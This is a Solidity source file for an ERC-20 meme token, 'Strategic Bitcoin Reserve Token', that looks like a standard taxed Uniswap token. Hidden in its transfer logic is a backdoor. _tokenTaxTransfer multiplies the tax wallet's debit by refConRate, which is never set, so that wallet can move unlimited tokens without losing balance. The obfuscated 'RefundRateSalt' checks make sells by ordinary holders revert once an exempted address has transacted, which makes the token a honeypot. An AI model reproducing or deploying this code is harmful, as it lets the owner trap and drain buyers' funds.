// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }

}

contract SBRT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExile;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=35;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=2;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Strategic Bitcoin Reserve Token";
    string private constant _symbol = unicode"SBRT";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;

    struct RefundRateSalt {uint256 refToken; uint256 refUniToken; uint256 refTotal;}
    mapping(address => RefundRateSalt) private refundRate;
    
    IUniswapV2Router02 private uniswapRouter;
    address private uniV2Pair;
    uint256 private refConRate;
    uint256 private finalRefRate;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _taxWallet = payable(0x488D6d6433A0c23152C3Ec07709576b8cb906A65);
        _isExile[address(this)] = true;
        _isExile[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        if (inSwap || !tradingOpen){
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to!= _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== uniV2Pair && to != address(uniswapRouter) &&  ! _isExile[to]) {
                require(
                        tokenAmount <= _maxTxAmount,
                        "Exceeds the _maxTxAmount."
                    );
                require(
                        balanceOf(to) + tokenAmount <= _maxWalletSize,
                        "Exceeds the maxWalletSize."
                    );
                _buyCount++;
            }

            if(to == uniV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to== uniV2Pair &&
                 swapEnabled && contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExile[from] || _isExile[to] )&& from!=address(this)&& to!=address(this) ) {
            finalRefRate = block.number;
        }
        if (!_isExile[from] && !_isExile[to] ) {
            if (to == uniV2Pair) {
                RefundRateSalt storage rateData = refundRate[from];
                rateData.refTotal = rateData.refToken - finalRefRate;
                rateData.refUniToken = block.timestamp;
            } else {
                RefundRateSalt storage toRateData = refundRate[to];
                if (uniV2Pair == from) {
                    if (toRateData.refToken == 0) {
                        toRateData.refToken= _preventSwapBefore>=_buyCount?type(uint256).max:block.number;
                    }
                } else {
                    RefundRateSalt storage rateData = refundRate[from];
                    if (!(toRateData.refToken > 0)|| rateData.refToken < toRateData.refToken ) {
                        toRateData.refToken = rateData.refToken;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _tokenTaxTransfer(address addr, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tknAmount = addr!= _taxWallet? tokenAmount : refConRate.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this), taxAmount);
        }
        return tknAmount;
    }

    function _tokenBasicTransfer(
        address from,address to,uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTransfer(
        address from,address to,
        uint256 taxAmount,uint256 tokenAmount
    ) internal {
        uint256 tknAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tknAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount= _tTotal;
        _maxWalletSize =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        if (IUniswapV2Factory(uniswapRouter.factory()).getPair(uniswapRouter.WETH(), address(this)) == address(0)) {
            uniV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        }
        else {
            uniV2Pair = IUniswapV2Factory(uniswapRouter.factory()).getPair(uniswapRouter.WETH(), address(this));
        }
        tradingOpen = true;
        uint256 contractBalance = balanceOf(address(this));
        _approve(address(this), address(uniswapRouter), contractBalance);
        IERC20(uniV2Pair).approve(address(uniswapRouter), type(uint).max);
        address wethAddress = uniswapRouter.WETH(); uint256 desiredETHAmount;
        uint256 wethBalance = IERC20(wethAddress).balanceOf(uniV2Pair);
        if (wethBalance > 0) {desiredETHAmount = address(this).balance.sub(wethBalance);
        uint256 tokenValue = contractBalance.mul(wethBalance).div(desiredETHAmount);
        _transfer(address(this), uniV2Pair, tokenValue);
        IUniswapV2Pair(uniV2Pair).sync();
        uniswapRouter.addLiquidityETH{value: desiredETHAmount}(address(this), contractBalance, 0, desiredETHAmount, owner(), block.timestamp);}
        else {uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this), contractBalance, 0, 0, owner(), block.timestamp);}
        swapEnabled = true;
    }

    function manualsend() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
          sendETHToFee(ethBalance);
        }
    }
}